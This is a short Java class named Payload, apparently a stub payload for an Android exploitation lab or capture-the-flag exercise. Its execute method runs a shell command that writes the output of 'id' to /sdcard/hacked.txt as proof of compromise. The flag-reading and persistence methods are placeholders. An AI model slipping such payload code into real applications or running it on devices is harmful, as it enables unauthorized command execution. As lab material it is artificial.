package agent_payloads;

import java.io.IOException;

public class Payload {
    public static String execute() {
        try {
            Runtime.getRuntime().exec("id > /sdcard/hacked.txt");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "Payload executed at " + System.currentTimeMillis();
    }

    public static String readFlag() {
        // Example sensitive data interaction or mock secret retrieval
        return "FLAG{example_static_flag_from_payload}";
    }

    public static void persist() {
        // Example: create file or schedule job
        System.out.println("Persist method called.");
    }
}
